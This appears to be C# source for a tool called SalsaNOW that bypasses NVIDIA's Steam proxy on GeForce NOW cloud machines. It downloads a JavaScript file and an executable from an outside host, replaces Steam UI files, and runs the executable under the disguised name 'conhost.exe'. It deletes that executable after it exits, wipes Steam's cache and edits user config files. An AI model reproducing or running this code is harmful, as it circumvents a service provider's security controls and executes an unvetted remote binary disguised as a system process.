using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace SalsaNOW
{
    internal static class SteamManager
    {
        // Steam Server (NVIDIA Made Proxy Interceptor for Steam) "127.10.0.231:9753"
        // Steam Server communicates with Steam by proxy and intercepts function calls from Steam by
        // making them not happen or replaces them with special made ones to do something else.
        // Shutting the server down by POST request and loading custom config will lead to all opted-in games on
        // GeForce NOW to show up on Steam.
        
        public static async Task ShutdownServerAsync(string globalDirectory)
        {
            try
            {
                string usgMask = Path.Combine(globalDirectory, "conhost.exe");
                string destinationDir = @"C:\Program Files (x86)\Steam\steamui";

                string cache = @"C:\Program Files (x86)\Steam\appcache";

                await DisableSteamInput();

                if (!Directory.Exists(@"C:\Program Files (x86)\Steam\steamuiNV"))
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = @"/c xcopy ""C:\Program Files (x86)\Steam\steamui"" ""C:\Program Files (x86)\Steam\steamuiOG"" /E /I /H /Y",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    })?.WaitForExit();

                    File.Delete(@"C:\Program Files (x86)\Steam\steamuiOG\chunk~2dcc5aaf7.js");

                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = @"/c ren ""C:\Program Files (x86)\Steam\steamui"" ""steamuiNV""",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    })?.WaitForExit();

                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = @"/c ren ""C:\Program Files (x86)\Steam\steamuiOG"" ""steamui""",
                        UseShellExecute = false,
                        CreateNoWindow = true
                    })?.WaitForExit();
                }

                using (var chunkClient = new WebClient())
                using (var usgClient = new WebClient())
                {
                    var chunkDownload = chunkClient.DownloadFileTaskAsync(new Uri("https://salsanowfiles.work/USG/chunk~2dcc5aaf7.js"), destinationDir + "\\chunk~2dcc5aaf7.js");
                    var usgDownload = usgClient.DownloadFileTaskAsync(new Uri("https://salsanowfiles.work/USG/bleh.exe"), usgMask);
                    await Task.WhenAll(chunkDownload, usgDownload);
                }

                // Steam USG Bypass Part (Temporary until patch discovered)

                Process usg = null;

                if (SalsaSettings.SteamSilentLaunch)
                {
                    usg = Process.Start(new ProcessStartInfo
                    {
                        FileName = usgMask,
                        Arguments = "-silent",
                        UseShellExecute = true
                    });
                }
                else
                {
                    usg = Process.Start(usgMask);
                }

                await Task.Delay(200);

                if (Directory.Exists(cache)) Directory.Delete(cache, true);

                // Start Startup Batch file if user has it available
                string batch = Path.Combine(globalDirectory, "StartupBatch.bat");
                if (File.Exists(batch)) Process.Start(new ProcessStartInfo { FileName = batch, UseShellExecute = true });

                _ = Task.Run(async () =>
                {
                    try
                    {
                        if (usg != null) { while (!usg.HasExited) await Task.Delay(1000); }
                        await Task.Delay(200);
                        if (File.Exists(usgMask)) File.Delete(usgMask);
                    }
                    catch { }
                });
                
                SalsaLogger.Info("Steam Proxy successfully bypassed.");
            }
            catch (Exception ex) { SalsaLogger.Error($"Steam Proxy Shutdown Error: {ex.Message}"); }
        }

        private static async Task DisableSteamInput()
        {
            string userData = @"C:\Program Files (x86)\Steam\userdata";

            if (!Directory.Exists(userData))
                return;

            foreach (var file in Directory.EnumerateFiles(
                         userData,
                         "localconfig.vdf",
                         SearchOption.AllDirectories))
            {
                try
                {
                    string content;

                    using (var reader = new StreamReader(file))
                    {
                        content = await reader.ReadToEndAsync();
                    }

                    // Find:
                    // "SteamController_XBoxSupport"        "1"
                    string pattern = "\"SteamController_XBoxSupport\"\\s+\"1\"";

                    if (Regex.IsMatch(content, pattern))
                    {
                        string updated = Regex.Replace(
                            content,
                            pattern,
                            "\"SteamController_XBoxSupport\"\t\t\"0\""
                        );

                        using (var writer = new StreamWriter(file, false))
                        {
                            await writer.WriteAsync(updated);
                        }

                        SalsaLogger.Info($"[!] Steam Input has been found being enabled, Steam Input has been disabled to prevent gamepad issues.");
                    }
                }
                catch (Exception ex)
                {
                    SalsaLogger.Error($"[ERROR] {file} -> {ex.Message}");
                }
            }
        }
    }
}